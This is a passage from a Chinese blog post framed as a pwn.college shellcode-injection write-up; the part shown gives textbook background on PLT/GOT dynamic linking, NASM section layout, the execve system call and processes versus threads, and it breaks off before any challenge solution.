<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="PWN-College-Shellcode-Injection-Writeup, 老叭美食家">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>PWN-College-Shellcode-Injection-Writeup | 老叭美食家</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="老叭美食家" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/static/image/header/home.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">老叭美食家</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>联系</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">老叭美食家</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			联系
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PWN-College-Shellcode-Injection-Writeup</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tag/%E9%80%86%E5%90%91/">
                                <span class="chip bg-color">逆向</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/category/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-07-09
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-04-30
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    38 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="pwn-college-Shellcode-Injection"><a href="#pwn-college-Shellcode-Injection" class="headerlink" title="pwn.college Shellcode-Injection"></a>pwn.college Shellcode-Injection</h1><p><a target="_blank" rel="noopener" href="https://pwn.college/program-security/shellcode-injection/">https://pwn.college/program-security/shellcode-injection/</a></p>
<h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-PLT-和-GOT-有什么区别和联系"><a href="#1-PLT-和-GOT-有什么区别和联系" class="headerlink" title="1. PLT 和 GOT 有什么区别和联系"></a>1. PLT 和 GOT 有什么区别和联系</h3><p>PLT(Procedure Linkage Table) 和 GOT（Global offset Table）是ELF(Executable and Linkable Format)文件中用于动态链接的重要机制。他们协同工作来实现动态库函数的调用。</p>
<p>PLT(Procedure Linkage Table)</p>
<ul>
<li>位置：PLT位于可执行文件的代码段(.text段)中。</li>
<li>结构：PLT包含一系列跳转指令，这些指令在程序首次调用某个外部函数时，会跳转到一个存根stub代码，然后由动态链接器解析实际地址并修正跳转目标。</li>
<li>功能：延时绑定，PLT实现了延时绑定，即在程序运行时，只有在函数被第一次调用时，才会解析函数地址并跳转目标。PLT中的每个条目都是一个间接跳转，通过跳转到GOT中存储的地址来实现函数调用。</li>
</ul>
<p>GOT(Global Offset Table)</p>
<ul>
<li>位置：GOT位于可执行文件的数据段(.data段或.got段)中。</li>
<li>结构：GOT包含指向全局变量和外部函数地址的指针。在动态链接过程中，这些指针会被更新为实际的地址。</li>
<li>地址存储，GOT存储了外部函数和全局变量的实际地址，供程序在运行时使用。</li>
<li>动态链接：在程序加载时，动态链接器会解析并填充GOT表项。使得程序可以正确调用动态库中的函数和访问全局变量。</li>
</ul>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">程序调用 -&gt; PLT 条目 -&gt; GOT 表项 -&gt; 动态链接器 (第一次) -&gt; 解析并更新 GOT&#x2F;PLT -&gt; 实际函数
          -&gt; PLT 条目 -&gt; GOT 表项 -&gt; 实际函数 (后续)

GOT显示
.&#x2F;babyshell_level1:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000003d40 R_X86_64_RELATIVE  *ABS*+0x00000000000012e0
0000000000003d48 R_X86_64_RELATIVE  *ABS*+0x00000000000012a0
0000000000004008 R_X86_64_RELATIVE  *ABS*+0x0000000000004008
0000000000003fd8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable
0000000000003fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000003fe8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000003ff0 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable
0000000000003ff8 R_X86_64_GLOB_DAT  __cxa_finalize@GLIBC_2.2.5
0000000000004010 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000004020 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000003f68 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.5
0000000000003f70 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000003f78 R_X86_64_JUMP_SLOT  cs_free
0000000000003f80 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5
0000000000003f88 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000003f90 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000003f98 R_X86_64_JUMP_SLOT  __assert_fail@GLIBC_2.2.5
0000000000003fa0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000003fa8 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.5
0000000000003fb0 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000003fb8 R_X86_64_JUMP_SLOT  cs_disasm
0000000000003fc0 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000003fc8 R_X86_64_JUMP_SLOT  cs_open
0000000000003fd0 R_X86_64_JUMP_SLOT  cs_close


PLT显示

babyshell_level1:     file format elf64-x86-64
Disassembly of section .plt:
0000000000001020 &lt;.plt&gt;:
    1020:       ff 35 32 2f 00 00       pushq  0x2f32(%rip)        # 3f58 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
    1026:       f2 ff 25 33 2f 00 00    bnd jmpq *0x2f33(%rip)        # 3f60 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
    102d:       0f 1f 00                nopl   (%rax)
    1030:       f3 0f 1e fa             endbr64 
    1034:       68 00 00 00 00          pushq  $0x0
    1039:       f2 e9 e1 ff ff ff       bnd jmpq 1020 &lt;.plt&gt;
    103f:       90                      nop
    1040:       f3 0f 1e fa             endbr64 
    1044:       68 01 00 00 00          pushq  $0x1
    1049:       f2 e9 d1 ff ff ff       bnd jmpq 1020 &lt;.plt&gt;
    104f:       90                      nop
    1050:       f3 0f 1e fa             endbr64 
    1054:       68 02 00 00 00          pushq  $0x2
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h3 id="2-为什么要同时设计PLT和GOT表项"><a href="#2-为什么要同时设计PLT和GOT表项" class="headerlink" title="2. 为什么要同时设计PLT和GOT表项"></a>2. 为什么要同时设计PLT和GOT表项</h3><p>设计 PLT（Procedure Linkage Table）和 GOT（Global Offset Table）的目的是为了实现动态链接的高效和灵活。虽然理论上可以只用 PLT 来实现动态链接，但分开设计 PLT 和 GOT 有多个好处，下面解释其中的原因。</p>
<p>动态链接的基本目标</p>
<ul>
<li>延迟绑定（Lazy Binding）：在程序执行过程中，只在函数被首次调用时才解析其地址，减少启动时间。</li>
<li>位置无关代码（Position-Independent Code, PIC）：使得程序或共享库可以在内存中任意位置加载，提高内存利用率和安全性。</li>
<li>降低开销：减少每次调用动态函数时的性能开销。</li>
</ul>
<p>为什么分开设计 PLT 和 GOT</p>
<ol>
<li>分离代码和数据：<br> PLT：位于代码段，包含跳转指令和间接跳转表的索引。<br> GOT：位于数据段，包含实际函数和变量地址。<br> 分离使得代码段可以保持只读，有助于提高安全性（如防止代码段被修改）。</li>
<li>延迟绑定实现：<br> 首次调用：通过 PLT 条目跳转到 GOT 中的动态链接器解析函数。<br> 解析后：动态链接器更新 GOT 表项，指向实际函数地址。之后的调用直接通过 GOT 跳转到实际函数地址，减少开销。<br> 这种机制使得每个动态函数的地址只在第一次调用时解析一次，之后调用的开销很低。</li>
<li>位置无关代码支持：<br> GOT 表项：在加载时由动态链接器填充，提供实际地址，使得代码可以在任意位置加载。<br> PLT 表项：通过相对地址引用 GOT 表项，实现位置无关。</li>
<li>简化动态链接器实现：<br> 动态链接器可以集中管理 GOT 表项，解析并填充实际地址。<br> 更新 PLT 表项和 GOT 表项可以分别处理，简化动态链接器的逻辑。</li>
<li>提高效率：<br> 运行时性能：首次调用动态函数时，通过 PLT 跳转到动态链接器处理，之后通过 GOT 直接跳转到函数地址，减少每次调用的性能开销。<br> 内存使用：数据段中的 GOT 可以在程序运行时动态修改，而代码段中的 PLT 可以保持只读，提高内存保护的有效性。</li>
</ol>
<ul>
<li>PLT 和 GOT 的协同工作机制<ul>
<li>PLT 条目：存储间接跳转指令，通过 GOT 表项获取实际函数地址。</li>
<li>GOT 表项：初始指向动态链接器解析函数，解析后指向实际函数地址。</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">示例：调用 printf 函数的流程
1. 初始状态：
    PLT 表项指向 GOT 表项。
    GOT 表项指向动态链接器解析函数。
2. 第一次调用：
    调用 PLT 条目，跳转到 GOT 表项。
    GOT 表项指向动态链接器，解析 printf 的实际地址。
    动态链接器更新 GOT 表项，指向 printf 的实际地址。
3. 后续调用：
    PLT 通过 GOT 表项直接跳转到 printf 的实际地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>总结<br>PLT 和 GOT 分开设计的主要原因是为了实现高效、灵活和安全的动态链接机制。通过分离代码和数据、支持延迟绑定和位置无关代码，PLT 和 GOT 提供了一种有效的动态链接解决方案。虽然理论上可以只用 PLT，但分开设计带来了更好的性能和安全性。</li>
</ul>
<h3 id="3-nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？"><a href="#3-nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？" class="headerlink" title="3. nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？"></a>3. nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？</h3><p>在使用 NASM 编译汇编代码时，汇编器会将各个段（section）放置在目标文件中的不同位置。具体位置取决于目标文件格式，例如二进制文件、ELF 文件或其他格式。以下是几种常见目标文件格式及其段的放置位置和排列方式：</p>
<ol>
<li>二进制文件格式（-f bin）<br>二进制文件格式是最简单的格式，所有段都直接放在输出文件中，没有额外的头信息。</li>
</ol>
<p>.text 段：通常放在文件的起始位置。<br>.data 段：紧随 .text 段之后。<br>.bss 段：紧随 .data 段之后，但由于 .bss 段不包含初始化数据，通常在二进制文件中没有对应的部分，而是留出相应的空间。</p>
<pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| .text 段 (代码)   |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| .data 段 (已初始化数据) |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>ELF 文件格式（-f elf64）<br>ELF（Executable and Linkable Format）文件格式用于更复杂的可执行文件和共享库，包含详细的段信息和符号表。</li>
</ol>
<p>.text 段：放在文件的代码段，包含可执行代码。<br>.data 段：放在文件的数据段，包含已初始化的数据。<br>.bss 段：放在文件的未初始化数据段，在运行时初始化为零。</p>
<pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| ELF 文件头        |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| 程序头表         |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| .text 段 (代码)   |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| .data 段 (已初始化数据) |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| .bss 段 (未初始化数据)  |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+
</span></span>| 段头表           |
<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="4-关于execve函数"><a href="#4-关于execve函数" class="headerlink" title="4. 关于execve函数"></a>4. 关于execve函数</h3><p>execve 函数是一个系统调用，它用于在当前进程中执行一个新的程序。这个函数的声明通常在头文件 &lt;unistd.h&gt; 中，并且它是执行程序的最底层的接口之一。与其他 exec 系列函数不同，execve 允许直接指定要执行的程序文件路径、参数列表和环境变量列表。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pathname<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>参数</p>
<ul>
<li>pathname：这是一个指向要执行的程序文件路径的指针。可以是绝对路径或相对路径。</li>
<li>argv：这是一个指向字符串数组的指针，这些字符串是传递给新程序的参数列表。数组的最后一个元素必须是 NULL 指针，以标识参数列表的结束。</li>
<li>envp：这是一个指向字符串数组的指针，这些字符串是新程序的环境变量。数组的最后一个元素也必须是 NULL 指针，以标识环境变量列表的结束。</li>
</ul>
<p>返回值</p>
<ul>
<li>成功：execve 函数没有返回值。如果执行成功，新的程序将替换当前进程的地址空间，原程序的代码将不会继续执行。</li>
<li>失败：返回 -1，并设置 errno 来指示错误类型。</li>
</ul>
<p><strong>解释</strong><br>类似将执行代码替换成了新程序的代码，其他的都没变。</p>
<p>当 execve 成功执行时，当前进程的地址空间、堆栈、堆等都会被新程序替换。新程序从它的入口点开始执行，通常是 main 函数。当前进程的 PID 和打开的文件描述符等保持不变。execve 成功执行时，新程序会继承当前进程的权限和某些属性。具体来说，新进程继承的属性包括：</p>
<ol>
<li>进程ID（PID）和父进程ID（PPID）：新程序继承当前进程的PID和PPID，因此它在系统中的位置和关系保持不变。</li>
<li>用户和组ID：新程序继承当前进程的有效用户ID（EUID）、有效组ID（EGID）、真实用户ID（RUID）和真实组ID（RGID），这意味着它具有与当前进程相同的权限。</li>
<li>文件描述符：当前进程中打开的文件描述符会被继承，包括标准输入、标准输出和标准错误。如果文件描述符没有被标记为在执行新程序时关闭（即没有设置FD_CLOEXEC标志），它们会保持打开状态。</li>
<li>环境变量：execve传递的环境变量列表会被新程序继承。虽然可以通过参数传递一个新的环境变量列表，但如果传递的是当前环境变量列表，新程序将继承这些环境变量。</li>
<li>当前工作目录：新程序继承当前进程的工作目录。</li>
<li>资源限制：当前进程的资源限制（如CPU时间限制、文件大小限制等）会被新程序继承。</li>
<li>信号处理：新程序继承当前进程的信号屏蔽字，但信号处理程序将被重置为默认值。</li>
<li>进程组和会话：新程序继承当前进程所属的进程组和会话。</li>
</ol>
<h3 id="5-为什么设计了进程还要设计线程"><a href="#5-为什么设计了进程还要设计线程" class="headerlink" title="5. 为什么设计了进程还要设计线程"></a>5. 为什么设计了进程还要设计线程</h3><p>进程和线程是操作系统中两种基本的计算资源管理方式。它们各自有不同的特点和用途：</p>
<p>进程 (Process)</p>
<ul>
<li>定义：进程是操作系统分配资源（如内存、文件句柄等）的基本单位。每个进程都有独立的地址空间，并且通常包含多个线程。</li>
<li>地址空间：每个进程有自己独立的地址空间，一个进程中的数据不能被另一个进程直接访问。</li>
<li>资源开销：进程的创建和切换需要较多的资源和时间，因为涉及到完整的环境（包括内存空间和系统资源）的设置和保存。</li>
<li>安全性：由于进程之间的地址空间是独立的，一个进程的崩溃不会直接影响到其他进程，提高了系统的稳定性和安全性。</li>
</ul>
<p>线程 (Thread)</p>
<ul>
<li>定义：线程是进程中的一个执行单元，是CPU调度和执行的基本单位。一个进程可以包含一个或多个线程，这些线程共享进程的- 资源（如内存、文件句柄等）。</li>
<li>地址空间：线程共享同一个进程的地址空间和资源，因此线程之间可以直接访问彼此的数据。</li>
<li>资源开销：线程的创建和切换所需的资源和时间比进程少，因为线程之间共享资源，不需要像进程那样进行完整的环境设置和保存。</li>
<li>性能：由于线程共享进程的资源，线程间通信比进程间通信更加高效。线程适合需要频繁切换和快速响应的任务。</li>
</ul>
<p>为什么有了进程还要设计线程？</p>
<ul>
<li>提高并发性：线程允许在同一个进程内同时执行多个任务，提高了程序的并发性和效率，特别是在多核处理器上，能够更充分地利用CPU资源。</li>
<li>降低开销：线程的创建和切换比进程更轻量，适合需要快速响应和频繁切换的场景，如实时系统和交互式应用。</li>
<li>简化开发：线程之间共享同一进程的内存和资源，使得在同一进程内进行数据共享和通信更加简单和高效。对于需要大量数据共享的应用，使用线程可以简化开发复杂性。</li>
<li>资源共享：由于线程共享同一进程的资源，多个线程可以方便地访问和操作同一数据结构和资源，适合于需要高效访问共享资源的应用。</li>
</ul>
<p>总的来说，进程和线程各自有不同的应用场景和优势。进程提供了更高的隔离性和安全性，适合独立运行的任务；线程提供了更高的并发性和效率，适合需要快速响应和高效共享资源的任务。结合使用进程和线程，可以更好地满足不同类型应用的需求。</p>
<p><strong>进程的例子</strong></p>
<ul>
<li>独立的应用程序：例如，一个浏览器和一个文本编辑器是两个独立的应用程序，它们分别运行在自己的进程中。浏览器的崩溃不会影响文本编辑器，反之亦然。</li>
